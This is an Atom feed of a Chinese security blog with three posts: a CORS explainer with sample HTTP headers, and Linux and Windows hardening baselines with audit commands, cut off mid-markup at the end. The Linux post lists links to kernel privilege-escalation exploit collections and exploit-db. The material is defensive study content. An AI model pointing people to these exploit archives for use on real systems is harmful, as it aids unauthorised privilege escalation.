<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>guolala&#39;s blog</title>
  
  <subtitle>情迷不意乱</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-12-18T14:13:03.682Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>guolala</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>跨域资源共享CORS详解</title>
    <link href="http://yoursite.com/2018/12/18/%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/12/18/跨域资源共享CORS详解/</id>
    <published>2018-12-18T13:51:49.000Z</published>
    <updated>2018-12-18T14:13:03.682Z</updated>
    
    <content type="html"><![CDATA[<p>CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。</p><p>它允许浏览器向跨源服务器，发出<code>XMLHttpRequest</code>请求，从而克服了AJAX只能<strong>同源</strong>使用的限制。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。</p><p>整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。</p><p>因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。</p><h1 id="两种请求"><a href="#两种请求" class="headerlink" title="两种请求"></a>两种请求</h1><p>浏览器将CORS请求分成两类：简单请求（simple request）和非简单请求（not-so-simple request）。</p><p>只要同时满足以下两大条件，就属于简单请求。</p><pre><code>（1) 请求方法是以下三种方法之一：    HEAD    GET    POST（2）HTTP的头信息不超出以下几种字段：    Accept    Accept-Language    Content-Language    Last-Event-ID    Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain</code></pre><p>凡是不同时满足上面两个条件，就属于非简单请求。</p><p>浏览器对这两种请求的处理，是不一样的。</p><h2 id="简单请求"><a href="#简单请求" class="headerlink" title="简单请求"></a>简单请求</h2><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个<strong>Origin</strong>字段。</p><p>下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个<strong>Origin</strong>字段。</p><pre><code>GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...</code></pre><p>上面的头信息中，<strong>Origin</strong>字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。</p><p>如果<strong>Origin</strong>指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含<strong>Access-Control-Allow-Origin</strong>字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p><p>如果<strong>Origin</strong>指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8</code></pre><p>上面的头信息之中，有三个与CORS请求相关的字段，都以<strong>Access-Control-</strong>开头。</p><h3 id="（1）Access-Control-Allow-Origin"><a href="#（1）Access-Control-Allow-Origin" class="headerlink" title="（1）Access-Control-Allow-Origin"></a>（1）Access-Control-Allow-Origin</h3><p>该字段是必须的。它的值要么是请求时<strong>Origin</strong>字段的值，要么是一个*，表示接受任意域名的请求。</p><h3 id="（2）Access-Control-Allow-Credentials"><a href="#（2）Access-Control-Allow-Credentials" class="headerlink" title="（2）Access-Control-Allow-Credentials"></a>（2）Access-Control-Allow-Credentials</h3><p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p><h3 id="（3）Access-Control-Expose-Headers"><a href="#（3）Access-Control-Expose-Headers" class="headerlink" title="（3）Access-Control-Expose-Headers"></a>（3）Access-Control-Expose-Headers</h3><p>该字段可选。CORS请求时，XMLHttpRequest对象的<strong>getResponseHeader()</strong>方法只能拿到6个基本字段：<strong>Cache-Control</strong>、<strong>Content-Language</strong>、<strong>Content-Type</strong>、<strong>Expires</strong>、<strong>Last-Modified</strong>、<strong>Pragma</strong>。如果想拿到其他字段，就必须在<strong>Access-Control-Expose-Headers</strong>里面指定。上面的例子指定，<code>getResponseHeader(&#39;FooBar&#39;)</code>可以返回FooBar字段的值。</p><h3 id="withCredentials-属性"><a href="#withCredentials-属性" class="headerlink" title="withCredentials 属性"></a>withCredentials 属性</h3><p>上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定<strong>Access-Control-Allow-Credentials</strong>字段。</p><pre><code>Access-Control-Allow-Credentials: true</code></pre><p>另一方面，开发者必须在AJAX请求中打开<strong>withCredentials</strong>属性。</p><pre><code>var xhr = new XMLHttpRequest();xhr.withCredentials = true;</code></pre><p>否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p><p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显示关闭<strong>withCredentials</strong>。</p><pre><code>xhr.withCredentials = false;</code></pre><p>需要注意的是，如果要发送Cookie，<strong>Access-Control-Allow-Origin</strong>就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p><h2 id="非简单请求"><a href="#非简单请求" class="headerlink" title="非简单请求"></a>非简单请求</h2><p>非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者<strong>Content-Type</strong>字段的类型是<strong>application/json</strong>。</p><p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</p><p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的<strong>XMLHttpRequest</strong>请求，否则就报错。</p><p>下面是一段浏览器的JavaScript脚本。</p><pre><code>var url = &apos;http://api.alice.com/cors&apos;;var xhr = new XMLHttpRequest();xhr.open(&apos;PUT&apos;, url, true);xhr.setRequestHeader(&apos;X-Custom-Header&apos;, &apos;value&apos;);xhr.send();</code></pre><p>上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息<strong>X-Custom-Header</strong>。</p><p>浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。</p><pre><code>OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...</code></pre><p>“预检”请求用的请求方法是<strong>OPTIONS</strong>，表示这个请求是用来询问的。头信息里面，关键字段是<strong>Origin</strong>，表示请求来自哪个源。</p><p>除了<strong>Origin</strong>字段，”预检”请求的头信息包括两个特殊字段。</p><h3 id="（1）Access-Control-Request-Method"><a href="#（1）Access-Control-Request-Method" class="headerlink" title="（1）Access-Control-Request-Method"></a>（1）Access-Control-Request-Method</h3><p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p><h3 id="（2）Access-Control-Request-Headers"><a href="#（2）Access-Control-Request-Headers" class="headerlink" title="（2）Access-Control-Request-Headers"></a>（2）Access-Control-Request-Headers</h3><p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p><h3 id="预检请求的回应"><a href="#预检请求的回应" class="headerlink" title="预检请求的回应"></a>预检请求的回应</h3><p>服务器收到”预检”请求以后，检查了<strong>Origin</strong>、<strong>Access-Control-Request-Method</strong>和<strong>Access-Control-Request-Headers</strong>字段以后，确认允许跨源请求，就可以做出回应。</p><pre><code>HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain</code></pre><p>上面的HTTP回应中，关键的是<strong>Access-Control-Allow-Origin</strong>字段，表示<code>http://api.bob.com</code>可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p><p>如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</p><pre><code>XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.</code></pre><p>服务器回应的其他CORS相关字段如下。</p><pre><code>Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000</code></pre><h3 id="（1）Access-Control-Allow-Methods"><a href="#（1）Access-Control-Allow-Methods" class="headerlink" title="（1）Access-Control-Allow-Methods"></a>（1）Access-Control-Allow-Methods</h3><p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。</p><h3 id="（2）Access-Control-Allow-Headers"><a href="#（2）Access-Control-Allow-Headers" class="headerlink" title="（2）Access-Control-Allow-Headers"></a>（2）Access-Control-Allow-Headers</h3><p>如果浏览器请求包括<strong>Access-Control-Request-Headers</strong>字段，则<strong>Access-Control-Allow-Headers</strong>字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。</p><h3 id="（3）Access-Control-Allow-Credentials"><a href="#（3）Access-Control-Allow-Credentials" class="headerlink" title="（3）Access-Control-Allow-Credentials"></a>（3）Access-Control-Allow-Credentials</h3><p>该字段与简单请求时的含义相同。</p><h3 id="（4）Access-Control-Max-Age"><a href="#（4）Access-Control-Max-Age" class="headerlink" title="（4）Access-Control-Max-Age"></a>（4）Access-Control-Max-Age</h3><p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p><h3 id="浏览器的正常请求和回应"><a href="#浏览器的正常请求和回应" class="headerlink" title="浏览器的正常请求和回应"></a>浏览器的正常请求和回应</h3><p>一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个<strong>Origin</strong>头信息字段。服务器的回应，也都会有一个<strong>Access-Control-Allow-Origin</strong>头信息字段。</p><p>下面是”预检”请求之后，浏览器的正常CORS请求。</p><pre><code>PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0...</code></pre><p>上面头信息的<strong>Origin</strong>字段是浏览器自动添加的。</p><p>下面是服务器正常的回应。</p><pre><code>Access-Control-Allow-Origin: http://api.bob.comContent-Type: text/html; charset=utf-8</code></pre><p>上面头信息中，<strong>Access-Control-Allow-Origin</strong>字段是每次回应都必定包含的。</p><h1 id="与JSONP的比较"><a href="#与JSONP的比较" class="headerlink" title="与JSONP的比较"></a>与JSONP的比较</h1><p>CORS与JSONP的使用目的相同，但是比JSONP更强大。</p><p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CORS是一个W3C标准，全称是”跨域资源共享”（Cross-origin resource sharing）。&lt;/p&gt;
&lt;p&gt;它允许浏览器向跨源服务器，发出&lt;code&gt;XMLHttpRequest&lt;/code&gt;请求，从而克服了AJAX只能&lt;strong&gt;同源&lt;/stron
      
    
    </summary>
    
      <category term="SSRF" scheme="http://yoursite.com/categories/SSRF/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux系统配置安全</title>
    <link href="http://yoursite.com/2018/12/18/Linux%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/12/18/Linux系统配置安全/</id>
    <published>2018-12-18T09:42:10.000Z</published>
    <updated>2018-12-18T13:34:58.588Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux系统安全基线"><a href="#Linux系统安全基线" class="headerlink" title="Linux系统安全基线"></a>Linux系统安全基线</h1><h2 id="检测操作系统是否安装最新补丁"><a href="#检测操作系统是否安装最新补丁" class="headerlink" title="检测操作系统是否安装最新补丁"></a>检测操作系统是否安装最新补丁</h2><ul><li>操作系统长时间不更新易导致系统上存在较多的高中危漏洞。</li></ul><h2 id="检查操作系统是否修改banner"><a href="#检查操作系统是否修改banner" class="headerlink" title="检查操作系统是否修改banner"></a>检查操作系统是否修改banner</h2><ul><li>默认banner本地或远程登陆时候会显示当前操作系统的版本、内核版本等信息，造成系统信息泄露。</li></ul><h2 id="检查操作系统是否存在与系统无关账户"><a href="#检查操作系统是否存在与系统无关账户" class="headerlink" title="检查操作系统是否存在与系统无关账户"></a>检查操作系统是否存在与系统无关账户</h2><ul><li>UID为0的账户拥有超级管理员权限，系统除root用户外不应存在其他UID为0的用户。操作系统存在多个与系统无关的用户，易导致账户信息泄露等问题。</li></ul><h2 id="Linux系统安全基线-1"><a href="#Linux系统安全基线-1" class="headerlink" title="Linux系统安全基线"></a>Linux系统安全基线</h2><h3 id="检查操作系统是否存在空口令和脆弱性口令账户"><a href="#检查操作系统是否存在空口令和脆弱性口令账户" class="headerlink" title="检查操作系统是否存在空口令和脆弱性口令账户"></a>检查操作系统是否存在空口令和脆弱性口令账户</h3><ul><li>空口令账户不需要密码即可登录或容易被攻击者猜到，存在系统非授权访问的威胁。</li></ul><h3 id="检查操作系统是否配置口令策略和口令复杂度"><a href="#检查操作系统是否配置口令策略和口令复杂度" class="headerlink" title="检查操作系统是否配置口令策略和口令复杂度"></a>检查操作系统是否配置口令策略和口令复杂度</h3><ul><li>未设置合理的密码策略可能导致用户使用弱口令。</li></ul><h3 id="检查操作系统是否配置登录失败处理功能"><a href="#检查操作系统是否配置登录失败处理功能" class="headerlink" title="检查操作系统是否配置登录失败处理功能"></a>检查操作系统是否配置登录失败处理功能</h3><ul><li>未设置合理的账户锁定策略易导致系统密码被暴力破解等问题。</li></ul><h3 id="检查操作系统是否开启了不必要的服务"><a href="#检查操作系统是否开启了不必要的服务" class="headerlink" title="检查操作系统是否开启了不必要的服务"></a>检查操作系统是否开启了不必要的服务</h3><ul><li>根据最小化安装原则，系统应关闭不必要的服务，这些服务可以被恶意用户利用，曹诚阻断连接和利用特殊账号破坏系统等影响。</li></ul><h3 id="检查操作系统是否开启了Telnet协议远程登录"><a href="#检查操作系统是否开启了Telnet协议远程登录" class="headerlink" title="检查操作系统是否开启了Telnet协议远程登录"></a>检查操作系统是否开启了Telnet协议远程登录</h3><ul><li>Telnet采用明文传输协议，才传输过程中易被截取或篡改。</li></ul><h3 id="检查操作系统是否限制root用户远程登录"><a href="#检查操作系统是否限制root用户远程登录" class="headerlink" title="检查操作系统是否限制root用户远程登录"></a>检查操作系统是否限制root用户远程登录</h3><ul><li>未限制超级管理员用户远程登录易导致在非授权人员获得超级管理员口令是可远程登录操作系统。</li></ul><h3 id="检查操作系统是否显示su命令使用策略"><a href="#检查操作系统是否显示su命令使用策略" class="headerlink" title="检查操作系统是否显示su命令使用策略"></a>检查操作系统是否显示su命令使用策略</h3><ul><li>未设置su命令的使用策略可能导致普通用户在得到root用户密码后可以切换到root用户。</li></ul><h3 id="检查操作系统是否限制可登录服务器的IP地址"><a href="#检查操作系统是否限制可登录服务器的IP地址" class="headerlink" title="检查操作系统是否限制可登录服务器的IP地址"></a>检查操作系统是否限制可登录服务器的IP地址</h3><ul><li>进行终端访问地址的限定使得网络内其他用户也可以访问不该访问的服务器。</li></ul><h3 id="检查操作系统是否配置超时锁定时间"><a href="#检查操作系统是否配置超时锁定时间" class="headerlink" title="检查操作系统是否配置超时锁定时间"></a>检查操作系统是否配置超时锁定时间</h3><ul><li>没有设置超时锁定时间可能在管理员忘记锁定机器的情况下被非法攻击。</li></ul><h3 id="检查操作系统是否合理设置重要配置文件权限"><a href="#检查操作系统是否合理设置重要配置文件权限" class="headerlink" title="检查操作系统是否合理设置重要配置文件权限"></a>检查操作系统是否合理设置重要配置文件权限</h3><ul><li>不合理的权限易导致系统重要配置文件被非授权访问或篡改。</li></ul><h3 id="检查操作系统是否控制用户缺省访问权限"><a href="#检查操作系统是否控制用户缺省访问权限" class="headerlink" title="检查操作系统是否控制用户缺省访问权限"></a>检查操作系统是否控制用户缺省访问权限</h3><ul><li>umask的默认设置一般为022，这给新创建的文件默认权限755（777-022=755），这会给文件所有者读、写权限，但只给组成员和其他用户读权限。</li></ul><h3 id="检查操作系统是否开启审计功能，并配置审计策略"><a href="#检查操作系统是否开启审计功能，并配置审计策略" class="headerlink" title="检查操作系统是否开启审计功能，并配置审计策略"></a>检查操作系统是否开启审计功能，并配置审计策略</h3><ul><li>不完善的审计记录会导致对于系统操作事件记录不完全，当系统安全事件发生时，无法及时追踪到具体操作。</li></ul><h3 id="检查操作系统是否开启日志功能，并配置日志策略"><a href="#检查操作系统是否开启日志功能，并配置日志策略" class="headerlink" title="检查操作系统是否开启日志功能，并配置日志策略"></a>检查操作系统是否开启日志功能，并配置日志策略</h3><ul><li>不完善的日志功能不利于系统安全问题的追踪。</li></ul><h3 id="检查操作系统是否设置审计文件和日志文件权限"><a href="#检查操作系统是否设置审计文件和日志文件权限" class="headerlink" title="检查操作系统是否设置审计文件和日志文件权限"></a>检查操作系统是否设置审计文件和日志文件权限</h3><ul><li>易导致用户入侵操作记录被清理。</li></ul><h3 id="检查操作系统是否限制单个用户使用资源限度"><a href="#检查操作系统是否限制单个用户使用资源限度" class="headerlink" title="检查操作系统是否限制单个用户使用资源限度"></a>检查操作系统是否限制单个用户使用资源限度</h3><ul><li>不对单个用户使用资源进行限制可能导致单个用户操作（例如执行死循环）耗尽资源。</li></ul><h1 id="提权漏洞合集"><a href="#提权漏洞合集" class="headerlink" title="提权漏洞合集"></a>提权漏洞合集</h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><ul><li><a href="https://github.com/SecWiki/linux-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/linux-kernel-exploits</a></li></ul><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><ul><li><a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></li></ul><h2 id="Exploits-Dtatbase"><a href="#Exploits-Dtatbase" class="headerlink" title="Exploits Dtatbase"></a>Exploits Dtatbase</h2><ul><li><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux系统安全基线&quot;&gt;&lt;a href=&quot;#Linux系统安全基线&quot; class=&quot;headerlink&quot; title=&quot;Linux系统安全基线&quot;&gt;&lt;/a&gt;Linux系统安全基线&lt;/h1&gt;&lt;h2 id=&quot;检测操作系统是否安装最新补丁&quot;&gt;&lt;a href=&quot;#检测操
      
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
  </entry>
  
  <entry>
    <title>Windows系统配置安全</title>
    <link href="http://yoursite.com/2018/12/18/Windows%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E5%AE%89%E5%85%A8/"/>
    <id>http://yoursite.com/2018/12/18/Windows系统配置安全/</id>
    <published>2018-12-18T03:47:36.000Z</published>
    <updated>2018-12-18T09:24:12.686Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统安全基线"><a href="#操作系统安全基线" class="headerlink" title="操作系统安全基线"></a>操作系统安全基线</h1><p>服务器安全基线是为了满足安全规范要求，服务器必须要达到的安全最低标准。</p><h2 id="主要作用："><a href="#主要作用：" class="headerlink" title="主要作用："></a>主要作用：</h2><ul><li>设置口令复杂度策略，防止暴力破解密码。</li><li>控制用户或文件权限，减少被攻击后的影响。</li><li>最小化安装操作系统，防止不必要的服务带来的安全问题。</li></ul><h2 id="基线范围"><a href="#基线范围" class="headerlink" title="基线范围"></a>基线范围</h2><ul><li>操作系统</li><li>网络设备</li><li>数据库</li><li>中间件</li></ul><h1 id="Windows系统配置安全"><a href="#Windows系统配置安全" class="headerlink" title="Windows系统配置安全"></a>Windows系统配置安全</h1><h2 id="账户管理"><a href="#账户管理" class="headerlink" title="账户管理"></a>账户管理</h2><h3 id="多用户系统"><a href="#多用户系统" class="headerlink" title="多用户系统"></a>多用户系统</h3><ul><li>Windows不应只有一个管理员用户，应根据业务需求，设定不同的用户和用户组，如管理员用户、Web用户、数据库用户等。</li></ul><h3 id="定期检查用户，删除无用、过期的账户"><a href="#定期检查用户，删除无用、过期的账户" class="headerlink" title="定期检查用户，删除无用、过期的账户"></a>定期检查用户，删除无用、过期的账户</h3><ul><li>应保证所有用户均为有效且在用。</li></ul><h3 id="禁用Guest用户"><a href="#禁用Guest用户" class="headerlink" title="禁用Guest用户"></a>禁用Guest用户</h3><ul><li>系统应禁用Guest账户，Guest账户默认不开启。</li></ul><h3 id="更改默认管理员账户名称"><a href="#更改默认管理员账户名称" class="headerlink" title="更改默认管理员账户名称"></a>更改默认管理员账户名称</h3><ul><li>应更改默认的管理员名称administrator，防止暴力破解等问题。</li></ul><h3 id="不显示最后的用户名"><a href="#不显示最后的用户名" class="headerlink" title="不显示最后的用户名"></a>不显示最后的用户名</h3><ul><li>用户登出后，下次登陆时，不应显示登录名称</li></ul><h3 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理</li><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略</li></ul><h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2><h3 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h3><ul><li>应启用密码策略，根据规范设置密码长度、复杂度等选项。</li></ul><h3 id="更换密码周期"><a href="#更换密码周期" class="headerlink" title="更换密码周期"></a>更换密码周期</h3><ul><li>应定期更改静态口令，建议不超过90天。</li></ul><h3 id="用户锁定策略"><a href="#用户锁定策略" class="headerlink" title="用户锁定策略"></a>用户锁定策略</h3><ul><li>应配置账户锁定策略，防止暴力破解攻击。</li></ul><h3 id="检测方法-1"><a href="#检测方法-1" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;用户策略</li></ul><h2 id="权限管理"><a href="#权限管理" class="headerlink" title="权限管理"></a>权限管理</h2><h3 id="远程关机"><a href="#远程关机" class="headerlink" title="远程关机"></a>远程关机</h3><ul><li>应只有管理员用户可以远程关闭操作系统。</li></ul><h3 id="本地关机"><a href="#本地关机" class="headerlink" title="本地关机"></a>本地关机</h3><ul><li>只有管理员用户可以本地关闭操作系统。</li></ul><h3 id="用户权限指派"><a href="#用户权限指派" class="headerlink" title="用户权限指派"></a>用户权限指派</h3><ul><li>取得文件或其他对象的所有权限应只分配给administrators组</li></ul><h3 id="授权用户登录"><a href="#授权用户登录" class="headerlink" title="授权用户登录"></a>授权用户登录</h3><ul><li>配置指定授权用户允许本地登陆此计算机。</li></ul><h3 id="授权账户从网络访问"><a href="#授权账户从网络访问" class="headerlink" title="授权账户从网络访问"></a>授权账户从网络访问</h3><ul><li>只允许授权账号从网络访问（包括网络共享等，但不包括终端服务）此计算机。</li></ul><h3 id="禁用未登录前关机"><a href="#禁用未登录前关机" class="headerlink" title="禁用未登录前关机"></a>禁用未登录前关机</h3><ul><li>如果启用此设置，服务器安全性将会大大降低，给远程连接的黑客可乘之机，所以建议禁用未登录前关机功能</li></ul><h3 id="检测方法-2"><a href="#检测方法-2" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略</li></ul><h2 id="日志审计"><a href="#日志审计" class="headerlink" title="日志审计"></a>日志审计</h2><h3 id="设置日志文件大小"><a href="#设置日志文件大小" class="headerlink" title="设置日志文件大小"></a>设置日志文件大小</h3><ul><li>设置应用日志文件大小至少为8192KB，可根据磁盘空间配置日志文件大小，记录的日志越多越好。</li><li>设置当达到最大的日志尺寸时，按需要轮询记录日志。</li></ul><h3 id="检测方法-3"><a href="#检测方法-3" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;本地安全策略-&gt;本地策略-&gt;审核策略</li><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;事件查看器-&gt;windows日志，查看应用日志、系统日志、安全日志属性中的日志大小，并根据安全策略设置达到日志最大大小时的操作。</li></ul><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><h3 id="关闭默认共享"><a href="#关闭默认共享" class="headerlink" title="关闭默认共享"></a>关闭默认共享</h3><ul><li>非域环境中，关闭Windows硬盘默认共享，例如C$,D$</li></ul><h3 id="设置共享文件夹权限"><a href="#设置共享文件夹权限" class="headerlink" title="设置共享文件夹权限"></a>设置共享文件夹权限</h3><ul><li>每个共享文件夹的共享权限，只允许授权的账户拥有共享此文件夹的权限。</li></ul><h3 id="检测方法-4"><a href="#检测方法-4" class="headerlink" title="检测方法"></a>检测方法</h3><ul><li>打开cmd，输入net share查看当前共享</li><li>控制面板-&gt;系统和安全-&gt;管理工具-&gt;计算机管理-&gt;共享文件夹，查看每个共享文件夹权限。</li></ul><h2 id="最小化安装"><a href="#最小化安装" class="headerlink" title="最小化安装"></a>最小化安装</h2><p>根据业务需求，禁用不必要的服务，删除不必要的文件</p><h2 id="其他设置"><a href="#其他设置" class="headerlink" title="其他设置"></a>其他设置</h2><ul><li>应安装防病毒软件，确保病毒库及时更新。</li><li>设置从屏幕保护恢复时需要输入密码，并将屏幕保护自动开启时间设定为五分钟。</li><li>对于远程登录的账户，设置不活动超过时间15分钟地洞断开连接。</li><li>关闭自动播放功能，防止自动运行恶意程序。</li><li>无特殊需求应该关闭远程桌面。</li><li>无特殊需求应该关闭远程协助。</li><li>开启windows防火墙，对进出站规则进行限制。</li></ul><h1 id="检测脚本编写"><a href="#检测脚本编写" class="headerlink" title="检测脚本编写"></a>检测脚本编写</h1><h2 id="检测用户相关"><a href="#检测用户相关" class="headerlink" title="检测用户相关"></a>检测用户相关</h2><pre><code>net user        //查看系统用户net user college        //查看具体用户信息net localgroup        //查看用户组net localgroup Administrators        //查看Administrators用户组net localgroup Guests        //查看Guests用户组</code></pre><h2 id="本地策略"><a href="#本地策略" class="headerlink" title="本地策略"></a>本地策略</h2><pre><code>secedit /export /cfg C:\temp.txt </code></pre><p>导出本地安全策略到<code>c:\temp.txt</code>中 </p><p>密码复杂度、更改密码周期(0表示禁用，1表示启用)</p><pre><code>PasswordComplexity        //密码必须符合复杂性要求MinimumPasswordLength        //密码长度最小值MinimumPasswordAge        //密码最短使用期限MaximumPasswordAge        //密码最长使用期限PasswordHistorySize        //强制密码历史</code></pre><p>账户锁定策略(无结果表示未开启）</p><pre><code>LockoutDuration        //账户锁定时间LockoutBadCount        //账户锁定阈值</code></pre><p>审核策略(0表示无审核，1表示成功审核，2表示失败审核，3表示成功和失败审核)</p><pre><code>AuditAccountManage        //审核帐户管理AuditAccountLogon        //审核帐户登录事件AuditSystemEvents        //审核系统事件AuditDSAccess        //审核目录服务访问AuditProcessTracking        //审核过程跟踪AuditPrivilegeUse        //审核特权使用AuditObjectAccess        //审核对象访问AuditLogonEvents        //审核登录事件AuditPolicyChange        //审核策略更改</code></pre><p>安全选项（0表示已停用，1表示已启用）</p><pre><code>AutoDisconnect        //在挂起会话之前所需的空闲时间DontDisplayLastUserName        //不显示上次登录的用户名ClearPageFileAtShutdown        //关机前清理虚拟内存页面ShutdownWithoutLogon        //允许在未登录前关机</code></pre><p>用户权利分配（Everyone:S-1-1-0 Administrators:S-1-5-32-544 Users:S-1-5-32-545 Power Users:S-1-5-32-547 Backup Operators:*S-1-5-32-551）</p><pre><code>SeRemoteShutdownPrivilege        //从远程系统强制关机SeTakeOwnershipPrivilege        //取得文件或其他对象所有权SeInteractiveLogonRight        //从本地登录此计算机SeRemoteInteractiveLogonRight        //允许通过远程桌面服务登录SeDebugPrivilege        //调试程序SeSystemtimePrivilege        //更改系统时间SeSecurityPrivilege        //管理审核和安全日志</code></pre><p>最后删除C盘中的临时文件</p><pre><code>del C:\temp.txt</code></pre><h2 id="注册表信息"><a href="#注册表信息" 